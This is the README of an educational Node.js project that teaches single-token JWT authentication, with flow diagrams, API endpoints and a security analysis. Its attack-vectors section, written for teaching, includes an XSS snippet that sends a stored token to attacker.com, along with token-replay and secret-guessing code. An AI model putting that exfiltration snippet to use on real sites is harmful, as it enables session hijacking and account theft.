# 🔐 JWT Authentication (Single Token Approach)

> **Project #3** in the Authentication Methods Learning Series

A complete implementation of JWT-based authentication using a single long-lived token approach. This project demonstrates the fundamentals of JSON Web Tokens, their security implications, and why this approach is **not recommended for production**.

[![Node.js](https://img.shields.io/badge/Node.js-18+-green.svg)](https://nodejs.org/)
[![Express](https://img.shields.io/badge/Express-5.x-blue.svg)](https://expressjs.com/)
[![JWT](https://img.shields.io/badge/JWT-9.x-orange.svg)](https://jwt.io/)
[![MongoDB](https://img.shields.io/badge/MongoDB-9.x-green.svg)](https://www.mongodb.com/)

---

## 📋 Table of Contents

- [Overview](#-overview)
- [Architecture](#-architecture)
- [Complete Workflow Diagrams](#-complete-workflow-diagrams)
- [Project Structure](#-project-structure)
- [Installation](#-installation)
- [API Endpoints](#-api-endpoints)
- [Security Analysis](#-security-analysis)
- [Attack Vectors](#-attack-vectors)
- [Testing](#-testing)
- [Key Learnings](#-key-learnings)

---

## 🎯 Overview

### What is JWT?

**JSON Web Token (JWT)** is a compact, URL-safe token format that represents claims between two parties. It's **self-contained** and **stateless**, meaning all user information is stored within the token itself.

### JWT Structure

```
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VySWQiOiIxMjMifQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c
     ↑ HEADER (Base64)          ↑ PAYLOAD (Base64)    ↑ SIGNATURE (HMAC SHA256)
```

**Header:**
```json
{
  "alg": "HS256",
  "typ": "JWT"
}
```

**Payload:**
```json
{
  "userId": "507f1f77bcf86cd799439011",
  "email": "user@example.com",
  "iat": 1701234567,
  "exp": 1701238167
}
```

**Signature:**
```
HMACSHA256(
  base64UrlEncode(header) + "." + base64UrlEncode(payload),
  JWT_SECRET
)
```

---

## 🏗️ Architecture

### Tech Stack

| Technology | Purpose |
|------------|---------|
| **Node.js** | Runtime environment |
| **Express.js** | Web framework |
| **MongoDB** | Database |
| **Mongoose** | ODM for MongoDB |
| **jsonwebtoken** | JWT generation & verification |
| **bcrypt** | Password hashing |
| **cookie-parser** | Parse HTTP cookies |

### Key Features

- ✅ JWT-based authentication
- ✅ HTTP-only cookie storage (XSS protection)
- ✅ Bearer token support (API testing)
- ✅ Password hashing with bcrypt
- ✅ Token expiration (1 hour)
- ✅ Protected routes with middleware
- ✅ Stateless authentication

---

## 📊 Complete Workflow Diagrams

### 1. Registration Flow

```mermaid
sequenceDiagram
    participant Client
    participant Express
    participant AuthController
    participant JWTHelper
    participant MongoDB
    participant Cookie

    Client->>Express: POST /users/register
    Note over Client,Express: { name, email, password }
    
    Express->>AuthController: register()
    
    AuthController->>AuthController: Validate input
    Note over AuthController: Check required fields
    
    AuthController->>MongoDB: User.insertOne()
    Note over MongoDB: Hash password with bcrypt<br/>Store user in DB
    
    MongoDB-->>AuthController: User created
    Note over MongoDB: Returns user object
    
    AuthController->>JWTHelper: generateToken({ userId, email })
    
    JWTHelper->>JWTHelper: jwt.sign(payload, SECRET, { expiresIn: '1h' })
    Note over JWTHelper: Creates signed JWT<br/>Algorithm: HS256
    
    JWTHelper-->>AuthController: JWT token
    Note over JWTHelper: "eyJhbGciOiJIUzI1NiIs..."
    
    AuthController->>Cookie: Set HTTP-only cookie
    Note over Cookie: httpOnly: true<br/>secure: production only<br/>sameSite: 'strict'<br/>maxAge: 24h
    
    AuthController-->>Client: 201 Created
    Note over AuthController,Client: { message, user, token }
```

### 2. Login Flow

```mermaid
sequenceDiagram
    participant Client
    participant Express
    participant AuthController
    participant MongoDB
    participant Bcrypt
    participant JWTHelper
    participant Cookie

    Client->>Express: POST /users/login
    Note over Client,Express: { email, password }
    
    Express->>AuthController: login()
    
    AuthController->>MongoDB: User.findOne({ email })
    
    alt User not found
        MongoDB-->>AuthController: null
        AuthController-->>Client: 400 User not found
    else User found
        MongoDB-->>AuthController: User document
        
        AuthController->>Bcrypt: comparePassword(password)
        Note over Bcrypt: Compare hashed password
        
        alt Invalid password
            Bcrypt-->>AuthController: false
            AuthController-->>Client: 404 Wrong password
        else Valid password
            Bcrypt-->>AuthController: true
            
            AuthController->>JWTHelper: generateToken({ userId, email })
            
            JWTHelper->>JWTHelper: jwt.sign()
            Note over JWTHelper: Sign with JWT_SECRET<br/>Expires in 1 hour
            
            JWTHelper-->>AuthController: JWT token
            
            AuthController->>Cookie: Set HTTP-only cookie
            Note over Cookie: Store token securely
            
            AuthController-->>Client: 200 OK
            Note over AuthController,Client: { message: "logged in", token }
        end
    end
```

### 3. Protected Route Access Flow

```mermaid
sequenceDiagram
    participant Client
    participant Express
    participant AuthMiddleware
    participant JWTHelper
    participant ProtectedController
    participant MongoDB

    Client->>Express: GET /api/profile
    Note over Client,Express: Cookie: token=eyJhbGci...<br/>OR<br/>Authorization: Bearer eyJhbGci...
    
    Express->>AuthMiddleware: checkAuth()
    
    AuthMiddleware->>AuthMiddleware: Extract token
    Note over AuthMiddleware: 1. Check req.cookies.token<br/>2. Check Authorization header
    
    alt No token found
        AuthMiddleware-->>Client: 401 Unauthorized
        Note over AuthMiddleware,Client: "No token provided"
    else Token found
        AuthMiddleware->>JWTHelper: verifyToken(token)
        
        JWTHelper->>JWTHelper: jwt.verify(token, SECRET)
        Note over JWTHelper: Verify signature<br/>Check expiration
        
        alt Token invalid/expired
            JWTHelper-->>AuthMiddleware: Error
            AuthMiddleware-->>Client: 401 Unauthorized
            Note over AuthMiddleware,Client: "Invalid or expired token"
        else Token valid
            JWTHelper-->>AuthMiddleware: Decoded payload
            Note over JWTHelper: { userId, email, iat, exp }
            
            AuthMiddleware->>AuthMiddleware: req.user = decoded
            Note over AuthMiddleware: Attach user to request
            
            AuthMiddleware->>ProtectedController: next()
            
            ProtectedController->>MongoDB: User.findById(req.user.userId)
            Note over MongoDB: Fetch user details
            
            MongoDB-->>ProtectedController: User document
            
            ProtectedController-->>Client: 200 OK
            Note over ProtectedController,Client: { message, user }
        end
    end
```

### 4. Logout Flow

```mermaid
sequenceDiagram
    participant Client
    participant Express
    participant AuthMiddleware
    participant AuthController
    participant Cookie

    Client->>Express: POST /users/logout
    Note over Client,Express: Cookie: token=eyJhbGci...
    
    Express->>AuthMiddleware: checkAuth()
    Note over AuthMiddleware: Verify user is authenticated
    
    AuthMiddleware->>AuthMiddleware: Verify JWT
    
    alt Token invalid
        AuthMiddleware-->>Client: 401 Unauthorized
    else Token valid
        AuthMiddleware->>AuthController: logout()
        
        AuthController->>Cookie: clearCookie('token')
        Note over Cookie: Remove token from browser
        
        AuthController-->>Client: 200 OK
        Note over AuthController,Client: { message: "Logged out successfully" }
        
        Note over Client: ⚠️ IMPORTANT:<br/>Token still valid until expiry!<br/>Just removed from browser
    end
```

### 5. Token Storage & Transmission

```mermaid
graph TB
    subgraph "Server Side"
        A[JWT Generation] -->|jwt.sign| B[JWT Token]
        B -->|Set-Cookie| C[HTTP Response]
        B -->|JSON Body| C
    end
    
    subgraph "Client Side - Cookie Storage ✅ Secure"
        C -->|Automatic| D[Browser Cookie Jar]
        D -->|httpOnly: true| E[NOT accessible via JavaScript]
        D -->|secure: true| F[HTTPS only in production]
        D -->|sameSite: strict| G[CSRF Protection]
    end
    
    subgraph "Client Side - localStorage ❌ Vulnerable"
        C -->|Manual| H[localStorage.setItem]
        H -->|Vulnerable| I[XSS can steal token]
    end
    
    subgraph "Subsequent Requests"
        D -->|Cookie header| J[Automatic transmission]
        H -->|Authorization header| K[Manual transmission]
        J --> L[Server receives token]
        K --> L
    end
```

### 6. JWT Verification Process

```mermaid
flowchart TD
    A[Incoming Request] --> B{Token exists?}
    B -->|No ❌| C[401 Unauthorized]
    B -->|Yes ✅| D[Extract token from cookie/header]
    
    D --> E[jwt.verify token, JWT_SECRET]
    
    E --> F{Valid signature?}
    F -->|No ❌| G[401 Invalid token]
    
    F -->|Yes ✅| H{Token expired?}
    H -->|Yes ❌| I[401 Token expired]
    
    H -->|No ✅| J[Decode payload]
    J --> K[Extract userId, email]
    K --> L[Attach to req.user]
    L --> M[Call next]
    M --> N[✅ Execute route handler]
```

### 7. Complete Data Flow

```mermaid
graph LR
    subgraph "Client"
        A[Browser/Postman]
    end
    
    subgraph "Express Server"
        B[app.js]
        C[cookieParser]
        D[Routes]
        E[Middleware]
        F[Controllers]
    end
    
    subgraph "🔐 Authentication Layer"
        G[authMiddleware.js]
        H[jwtHelper.js]
    end
    
    subgraph "Data Layer"
        I[User Model]
        J[MongoDB]
    end
    
    A -->|HTTP Request| B
    B --> C
    C --> D
    D --> E
    E --> G
    G --> H
    H -->|✅ Valid| F
    H -->|❌ Invalid| A
    F --> I
    I --> J
    J -->|Response| A
```

---

## 📁 Project Structure

```
Auth-v3/
├── config/
│   └── db.js                 # MongoDB connection
├── controller/
│   ├── authController.js     # Register, Login, Logout
│   └── protectedController.js # Profile, Dashboard
├── middleware/
│   └── authMiddleware.js     # JWT verification middleware
├── models/
│   └── usersModel.js         # User schema & methods
├── routes/
│   ├── authRoutes.js         # Auth endpoints
│   └── protectedRoutes.js    # Protected endpoints
├── utils/
│   └── jwtHelper.js          # JWT sign & verify functions
├── .env                      # Environment variables
├── app.js                    # Express server setup
├── package.json              # Dependencies
└── README.md                 # This file
```

---

## 🚀 Installation

### Prerequisites

- Node.js 18+
- MongoDB (local or Atlas)

### Setup

1. **Clone the repository**
   ```bash
   git clone <your-repo-url>
   cd Auth-v3
   ```

2. **Install dependencies**
   ```bash
   npm install
   ```

3. **Configure environment variables**
   
   Create a `.env` file:
   ```env
   JWT_SECRET=your_super_secret_key_minimum_32_characters_long
   JWT_EXPIRES_IN=1h
   NODE_ENV=development
   MONGO_URI=mongodb://localhost:27017/auth-jwt
   ```

   > ⚠️ **Security Note:** Use a strong, random secret (min 32 chars). Generate one:
   > ```bash
   > node -e "console.log(require('crypto').randomBytes(32).toString('hex'))"
   > ```

4. **Start the server**
   ```bash
   npm run dev
   ```

   Server runs on `http://localhost:5000`

---

## 🔌 API Endpoints

### Authentication Routes

#### 1. Register User

```http
POST /users/register
Content-Type: application/json

{
  "name": "John Doe",
  "email": "john@example.com",
  "password": "securePassword123"
}
```

**Response:**
```json
{
  "message": "User Registered Successfully",
  "details": {
    "_id": "507f1f77bcf86cd799439011",
    "name": "John Doe",
    "email": "john@example.com"
  },
  "token": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9..."
}
```

**Cookie Set:**
```
Set-Cookie: token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...; HttpOnly; SameSite=Strict; Max-Age=86400
```

---

#### 2. Login

```http
POST /users/login
Content-Type: application/json

{
  "email": "john@example.com",
  "password": "securePassword123"
}
```

**Response:**
```json
{
  "message": "logged in",
  "token": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9..."
}
```

---

#### 3. Logout

```http
POST /users/logout
Cookie: token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...
```

**Response:**
```json
{
  "message": "Logged out successfully"
}
```

> ⚠️ **Note:** Logout only clears the cookie. The token remains valid until expiration!

---

### Protected Routes

All protected routes require authentication via:
- **Cookie:** `token=<jwt>`
- **OR Header:** `Authorization: Bearer <jwt>`

#### 1. Get Profile

```http
GET /api/profile
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...
```

**Response:**
```json
{
  "message": "Profile route",
  "user": {
    "_id": "507f1f77bcf86cd799439011",
    "name": "John Doe",
    "email": "john@example.com",
    "createdAt": "2024-01-01T00:00:00.000Z"
  }
}
```

---

#### 2. Dashboard

```http
GET /api/dashboard
Cookie: token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...
```

**Response:**
```json
{
  "message": "Welcome to dashboard User: john@example.com"
}
```

---

## 🔒 Security Analysis

### Security Rating: **6.5/10** ⚠️

| Feature | Implementation | Rating |
|---------|----------------|--------|
| **Token Storage** | HTTP-only cookie | ✅ Excellent |
| **Token Expiry** | 1 hour | ✅ Good |
| **Secret Strength** | 64 characters | ✅ Excellent |
| **Algorithm** | HS256 | ✅ Good |
| **HTTPS** | Production only | ✅ Good |
| **Password Hashing** | bcrypt | ✅ Excellent |
| **XSS Protection** | httpOnly cookies | ✅ Excellent |
| **CSRF Protection** | sameSite: strict | ✅ Good |
| **Token Revocation** | ❌ None | ⚠️ **Critical Issue** |
| **Refresh Mechanism** | ❌ None | ⚠️ Missing |
| **Rate Limiting** | ❌ None | ⚠️ Missing |

### Strengths ✅

1. **HTTP-only Cookies**
   - JavaScript cannot access tokens
   - Prevents XSS token theft
   - Automatic transmission with requests

2. **Short Token Expiry**
   - 1-hour validity limits attack window
   - Reduces impact of token theft

3. **Strong Cryptography**
   - 64-character random secret
   - HMAC SHA256 algorithm
   - Impossible to brute force

4. **Secure Cookie Options**
   ```javascript
   {
     httpOnly: true,      // XSS protection
     secure: production,  // HTTPS only
     sameSite: 'strict',  // CSRF protection
     maxAge: 24h          // Auto-expiry
   }
   ```

### Weaknesses ❌

1. **No Token Revocation**
   - Cannot invalidate tokens before expiry
   - Stolen tokens remain valid for full duration
   - Password change doesn't invalidate existing tokens

2. **No Refresh Token**
   - User must re-login every hour
   - Poor user experience
   - No way to extend sessions

3. **Stateless = Uncontrollable**
   - Server doesn't track active sessions
   - Cannot force logout remotely
   - No visibility into who's logged in

4. **Missing Security Features**
   - No rate limiting (brute force vulnerable)
   - No account lockout
   - No suspicious activity detection

---

## ⚔️ Attack Vectors

### 1. XSS (Cross-Site Scripting) Attack

**Scenario:** Attacker injects malicious script

**If using localStorage:**
```javascript
// Attacker's malicious script
<script>
  fetch('https://attacker.com/steal', {
    method: 'POST',
    body: localStorage.getItem('token')
  });
</script>
```

**Result:** ❌ Token stolen

**Our Defense:** ✅ HTTP-only cookies (JavaScript cannot access)

---

### 2. Token Replay Attack

**Scenario:** Attacker intercepts and reuses valid token

```javascript
// Attacker captures token
const stolenToken = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...";

// Attacker uses it
fetch('http://localhost:5000/api/profile', {
  headers: { 'Authorization': `Bearer ${stolenToken}` }
});
```

**Result:** ✅ **Attack succeeds** (token is valid)

**Our Defense:** ⚠️ **None** - Token valid until expiry (1 hour)

**Mitigation:**
- Short expiry limits damage window
- Use refresh tokens (next project)
- Implement token rotation

---

### 3. Man-in-the-Middle (MITM)

**Scenario:** Attacker intercepts HTTP traffic

```
User → HTTP Request with JWT → Attacker intercepts → Steals token
```

**Result:** ❌ Token stolen (if using HTTP)

**Our Defense:** ✅ HTTPS in production (`secure: true`)

---

### 4. No Revocation Attack

**Timeline:**
```
09:00 AM - Attacker steals token (valid for 1 hour)
09:05 AM - User notices, changes password
09:10 AM - Attacker STILL has access!
10:00 AM - Token finally expires
```

**Result:** ❌ 55 minutes of unauthorized access

**Our Defense:** ❌ **None**

**Solutions:**
1. Token blacklist (defeats stateless purpose)
2. Token versioning in database
3. Short-lived access + refresh tokens

---

### 5. Brute Force Secret

**Scenario:** Attacker tries to guess JWT_SECRET

```javascript
const secrets = ['secret', '123456', 'password', ...];

for (let secret of secrets) {
  try {
    jwt.verify(stolenToken, secret);
    console.log('Found secret:', secret);
    break;
  } catch {}
}
```

**Result:** ❌ If secret is weak, attacker can forge tokens

**Our Defense:** ✅ 64-character random secret (impossible to brute force)

---

### 6. Token Forgery

**Scenario:** Attacker modifies token payload

```javascript
// Original payload
{ "userId": "123", "email": "user@example.com" }

// Attacker changes to admin
{ "userId": "999", "email": "admin@example.com" }
```

**Result:** ❌ Signature verification fails

**Our Defense:** ✅ HMAC signature prevents modification

---

## 🧪 Testing

### Using Postman/Thunder Client

#### 1. Register
```
POST http://localhost:5000/users/register
Body: { "name": "Test", "email": "test@test.com", "password": "test123" }
```

#### 2. Login
```
POST http://localhost:5000/users/login
Body: { "email": "test@test.com", "password": "test123" }
```

Copy the `token` from response.

#### 3. Access Protected Route (Cookie)
```
GET http://localhost:5000/api/profile
(Cookie automatically sent if using same client)
```

#### 4. Access Protected Route (Bearer)
```
GET http://localhost:5000/api/profile
Headers: Authorization: Bearer <paste-token-here>
```

#### 5. Logout
```
POST http://localhost:5000/users/logout
```

### Verify JWT on jwt.io

1. Copy token from login response
2. Go to [jwt.io](https://jwt.io)
3. Paste token in "Encoded" section
4. In "Verify Signature", paste your `JWT_SECRET`
5. See "Signature Verified" ✅

---

## 📚 Key Learnings

### ✅ When to Use JWT

- Microservices architecture
- Mobile applications
- Stateless APIs
- Short-lived access tokens
- Cross-domain authentication

### ❌ When NOT to Use JWT (Single Token)

- Long user sessions
- Need instant revocation
- Sensitive admin panels
- Frequent permission changes
- Real-time access control

### 🎯 Best Practices

1. **Always use HTTPS in production**
2. **Store in HTTP-only cookies** (not localStorage)
3. **Use short expiry times** (15 min - 1 hour)
4. **Implement refresh tokens** (Project #5)
5. **Add token versioning** for revocation
6. **Never expose JWT_SECRET**
7. **Use strong secrets** (min 32 chars)
8. **Implement rate limiting**
9. **Log authentication events**
10. **Monitor for suspicious activity**

---

## 🔄 Next Steps

This project demonstrates JWT basics but is **NOT production-ready**. Continue the learning series:

- **Project #4:** Short-lived JWT (15 min expiry)
- **Project #5:** Access + Refresh Tokens (production-ready)
- **Project #6:** OAuth 2.0 (delegated authentication)

---

## 📖 Resources

- [JWT.io](https://jwt.io/) - JWT debugger
- [RFC 7519](https://tools.ietf.org/html/rfc7519) - JWT specification
- [OWASP JWT Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/JSON_Web_Token_for_Java_Cheat_Sheet.html)
- [Auth0 JWT Handbook](https://auth0.com/resources/ebooks/jwt-handbook)

---

## 📝 License

MIT License - Feel free to use for learning purposes

---

## 👨‍💻 Author

**Learning Project** - Part of Authentication Methods Series

---

## ⚠️ Disclaimer

This implementation is for **educational purposes only**. Do not use in production without:
- Adding refresh tokens
- Implementing token revocation
- Adding rate limiting
- Proper error handling
- Security auditing
- HTTPS enforcement

---

**Happy Learning! 🚀**
